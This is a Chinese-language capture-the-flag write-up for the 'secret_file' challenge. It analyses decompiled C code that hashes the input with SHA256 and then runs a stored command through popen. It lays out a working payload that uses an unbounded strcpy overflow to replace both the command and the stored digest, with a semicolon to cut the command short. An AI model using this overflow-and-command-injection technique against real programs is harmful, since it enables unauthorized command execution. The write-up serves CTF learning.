# secret_file

题目来源：https://adworld.xctf.org.cn/task/

这道题目其实更重要的是对题目的代码的理解，只要知道了这段代码在干嘛其实漏洞的发现和利用是很容易找的。但是最终在利用漏洞的方法上还是有一点点小技巧。先看一下这道题的防护措施：

```
Arch:     amd64-64-little                                           
RELRO:    Full RELRO                                                
Stack:    Canary found                                                 
NX:       NX enabled                                               
PIE:      PIE enabled
```

这道题有意思的是把所有可能碰到的防护手段都开到了最大。意味着栈溢出的利用和普通的堆的注入都很难奏效了。所以先看一下代码，这道题的代码可能非常难理解：

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  char *v3; // rax
  unsigned __int8 *v4; // rbp
  int *v5; // rbx
  __int64 v6; // rcx
  char *v7; // rdi
  unsigned int v8; // er12
  FILE *v9; // rbp
  __int64 v11; // [rsp+0h] [rbp-308h]
  char *lineptr; // [rsp+8h] [rbp-300h]
  char dest; // [rsp+10h] [rbp-2F8h]
  __int64 v14; // [rsp+110h] [rbp-1F8h]
  _BYTE v15[5]; // [rsp+12Bh] [rbp-1DDh]
  int v16; // [rsp+16Ch] [rbp-19Ch]
  int v17; // [rsp+18Ch] [rbp-17Ch]
  int v18; // [rsp+1CCh] [rbp-13Ch]
  char s; // [rsp+1D0h] [rbp-138h]
  unsigned __int64 v20; // [rsp+2D8h] [rbp-30h]

  v20 = __readfsqword(0x28u);
  sub_55D6256ABE60(&dest);
  v11 = 0LL;
  lineptr = 0LL;
  if ( getline(&lineptr, (size_t *)&v11, stdin) == -1 )
    return 1;
  v3 = strrchr(lineptr, 10);
  if ( !v3 )
    return 1;
  *v3 = 0;
  v4 = (unsigned __int8 *)&v16;
  v5 = &v17;
  strcpy(&dest, lineptr);
  sub_55D6256ABDD0((__int64)&dest, &v16, 0x100u);
  do
  {
    v6 = *v4;
    v7 = (char *)v5;
    v5 = (int *)((char *)v5 + 2);
    ++v4;
    snprintf(v7, 3uLL, "%02x", v6);
  }
  while ( v5 != &v18 );
  v8 = strcmp(v15, (const char *)&v17);
  if ( v8 )
  {
    puts("wrong password!");
    return 1;
  }
  v9 = popen((const char *)&v14, "r");
  if ( !v9 )
    return 1;
  while ( fgets(&s, 256, v9) )
    printf("%s", &s);
  fclose(v9);
  return v8;
}
```

先看 main 函数，首先就会遇到一个 sub_55D6256ABE60，这是第一个需要理解的函数：

```C
unsigned __int64 __fastcall sub_55D6256ABE60(char *a1)
{
  __int64 v2; // [rsp+0h] [rbp-78h]
  __int64 v3; // [rsp+8h] [rbp-70h]
  __int64 v4; // [rsp+10h] [rbp-68h]
  __int16 v5; // [rsp+18h] [rbp-60h]
  char v6; // [rsp+1Ah] [rbp-5Eh]
  __int64 v7; // [rsp+20h] [rbp-58h]
  __int64 v8; // [rsp+28h] [rbp-50h]
  __int64 v9; // [rsp+30h] [rbp-48h]
  __int64 v10; // [rsp+38h] [rbp-40h]
  __int64 v11; // [rsp+40h] [rbp-38h]
  __int64 v12; // [rsp+48h] [rbp-30h]
  __int64 v13; // [rsp+50h] [rbp-28h]
  __int64 v14; // [rsp+58h] [rbp-20h]
  char v15; // [rsp+60h] [rbp-18h]
  unsigned __int64 v16; // [rsp+68h] [rbp-10h]

  v16 = __readfsqword(0x28u);
  v6 = 0;
  memset(a1, 0, 0x100uLL);
  v2 = 8386093036507587119LL;
  v3 = 7310014432551054880LL;
  v4 = 7002641623085768564LL;
  v5 = 25459;
  snprintf(
    a1 + 256,
    0x1BuLL,
    "%s",
    &v2,
    8386093036507587119LL,
    7310014432551054880LL,
    7002641623085768564LL,
    *(_QWORD *)&v5);
  v7 = 7291380990809223993LL;
  v8 = 3846974793129996595LL;
  v9 = 7149517611173568821LL;
  v10 = 7005684783558900022LL;
  v11 = 3703759022809560162LL;
  v12 = 3559359259495392098LL;
  v13 = 3544673966641145443LL;
  v14 = 3977295534107146545LL;
  v15 = 0;
  snprintf(a1 + 283, 0x41uLL, "%s", &v7);
  return __readfsqword(0x28u) ^ v16;
}
```

仔细看一下这个子函数，首先在 dest 参数开始部分的 256 个字节处全部初始化为 0，然后从第 257 位开始会分别两次放入数据，首先是放入一个长度为 0x1B 的字符串，然后放入一个长度为 0x41 的字符串。这就是 dest 初始情况下的结构，相当于由三部分构成。

继续看 main 函数，使用 getline 函数向 lineptr 中输入字符串，然后将该字符串复制到 dest 处。随后对现在的字符串调用 sub_55D6256ABDD0：

```c
unsigned __int64 __fastcall sub_55D6256ABDD0(__int64 a1, _QWORD *a2, unsigned int a3)
{
  unsigned int v3; // er12
  __int64 v5; // [rsp+0h] [rbp-A8h]
  unsigned __int64 v6; // [rsp+78h] [rbp-30h]

  v3 = a3;
  *a2 = 0LL;
  a2[1] = 0LL;
  v6 = __readfsqword(0x28u);
  a2[2] = 0LL;
  a2[3] = 0LL;
  SHA256_Init((__int64)&v5);
  SHA256_Update((__int64)&v5, a1, v3);
  SHA256_Final((__int64)a2, (__int64)&v5);
  return __readfsqword(0x28u) ^ v6;
}
```

在这个子函数中完成的是对 dest 字符串前 256 个字节进行 SHA256 运算，最后的结果会保存在 v16 中，v16 保存的是计算出来的 256bit(32 个字节) 的值。

while 循环将 32 个字节的数据用 16 进制表示出来，这样会占用 64 个字节的空间。直到最后仔细看，需要将这个摘要值和一个预设的摘要值进行比较，按照位置计算可以发现，其实就是在 dest 中第二次输入的字符串！

随后会使用 popen 执行一个命令，这里简单说一下 popen 函数：

> popen()函数通过创建一个管道，调用fork()产生一个子进程，执行一个shell以运行命令来开启一个进程。这样相当于执行了某个命令，然后将输出的结果保存在一个管道文件内。

如果仔细看一下参数的分布，可以发现使用 popen 执行的命令内容，恰好是 dest 字符串第一次额外输入的内容。

---

到这里基本上看懂了程序在干嘛了，那么漏洞点也很明显，在 getline 函数处以及下面的 strcpy 处都没有对输入的长度做限制，因此存在缓冲区的溢出。

由上面的分析可以直到 dest 的后面部分涉及了需要执行的命令和验证，所以覆盖 dest 字符串是很有意义的。事实上也能想到，如果将命令修改为 cat flag 并且将验证部分设置成已知的就可以了。确实，假设我们预先计算一下 256 个 a 的 SHA256 值然后附在 dest 后面也就直接破解了验证，自然而然的 payload 如下：

```
'a' * 256 + commandStr + SHA256('a' * 256)
```

最后的问题的是 commandStr，一开始我就是直接想插入 cat flag.txt 字符串，至于这个文件名是可以通过命令 ls 去获得的。但是由于 strcpy  会对 \0 截断，所以直接放字符串不行。这里的目的就是为了执行部分的命令，学到一招使用分号：

> 单行语句一般要用到分号来区分代码块，例如：
>
> ```
> if [ "$PS1" ]; then echo test is ok; fi
> test is ok
> ```
>
> 该脚本或命令行中，需要两个分号才为正确的语句，第一个分号是then前的分号，用于标识条件块结束，第二个分号在fi前，用于标识then块结束，如果缺少这两个分号，则程序执行错误。

所以在命令后面加个分号，无论后面填充什么，这前面的命令都会执行了，payload 就是：

```
'a' * 256 + 'cat flag.txt;'.ljust(0x1B, ' ') + SHA256('a' * 256)
```

